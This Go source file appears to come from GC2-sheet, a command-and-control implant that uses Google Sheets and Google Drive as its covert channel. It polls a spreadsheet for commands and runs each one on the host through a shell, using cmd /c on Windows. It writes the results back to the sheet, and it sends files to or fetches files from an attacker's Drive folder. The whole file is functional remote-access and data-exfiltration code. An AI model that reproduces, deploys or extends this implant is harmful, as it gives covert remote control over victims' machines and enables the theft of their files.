package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"google.golang.org/api/drive/v3"
	"google.golang.org/api/sheets/v4"
	"os/exec"
	"runtime"
	"strings"
)

func execute(client *sheets.Service, clientDrive *drive.Service, spreadSheet *configuration.SpreadSheet)  {

	// Get last command in the pool
	lastCommand := utils.GetLastCommand(spreadSheet)

	commandToExecute := ""
	if lastCommand.Input == "" {
		// Retrieve last command from the sheet
		commandToExecute = readSheet(client, spreadSheet)
	}

	if commandToExecute == "" {
		utils.LogDebug("No new command")
		return
	}
	utils.LogDebug("New command: " + commandToExecute)

	// Set new retrieved command
	lastCommand.Input = commandToExecute

	// Create new empty command before performing the current one (to avoid deadlock on command execution)
	utils.CreateNewEmptyCommand(spreadSheet)

	// Checking for download command
	if strings.HasPrefix(commandToExecute, "download"){
		slittedCommand := strings.Split(commandToExecute,";")
		if len(slittedCommand) == 3{
			fileDriveId := slittedCommand[1]
			downloadPath := slittedCommand[2]
			utils.LogDebug("New download command: FileId " + fileDriveId + " saving it to: " + downloadPath)
			downloadErr := downloadFile(clientDrive, fileDriveId, downloadPath)
			if downloadErr != nil {
				lastCommand.Output = downloadErr.Error()
			}else {
				lastCommand.Output = "File Downloaded"
			}
			writeSheet(client, spreadSheet, lastCommand)
			return
		}
	}

	// Checking for upload command
	if strings.HasPrefix(commandToExecute, "upload"){
		slittedCommand := strings.Split(commandToExecute,";")
		if len(slittedCommand) == 2{
			uploadFilePath := slittedCommand[1]
			utils.LogDebug("New upload command: file path: " + uploadFilePath)
			uploadErr := uploadFile(clientDrive, uploadFilePath, spreadSheet.DriveId)

			if uploadErr != nil {
				lastCommand.Output = uploadErr.Error()
			}else {
				lastCommand.Output = "File Uploaded to: https://drive.google.com/drive/u/0/folders/" + spreadSheet.DriveId
			}
			writeSheet(client, spreadSheet, lastCommand)
			return
		}
	}

	if commandToExecute == "exit"{
		Exit()
	}

	// Execute the command
	lastCommand.Output = executeCommand(commandToExecute)

	// Write output
	writeSheet(client, spreadSheet, lastCommand)

	utils.LogDebug("Execution")
}

func executeCommand(commandToExecute string) string {

	var arguments []string
	var out string
	var outCommand []byte
	var err error

	splitArgs := strings.Split(commandToExecute," ")
	if runtime.GOOS != "windows" {
		if len(splitArgs) > 1{
			// Get arguments after command Example: -la
			arguments = splitArgs[1:]
			// Get command without arguments Example: ls
			commandToExecute = splitArgs[0]
		}
		outCommand, err = exec.Command(commandToExecute, arguments...).Output()
	}else {
		// For windows commands must be on the form: "cmd /c <command>" Example "cmd /C dir"
		arguments = append(arguments, "/c")
		arguments = append(arguments, splitArgs...)
		outCommand, err = exec.Command("cmd", arguments...).Output()
	}

	if err != nil {
		out = err.Error()
		return out
	}else {
		out = string(outCommand)
		return out
	}

	return ""
}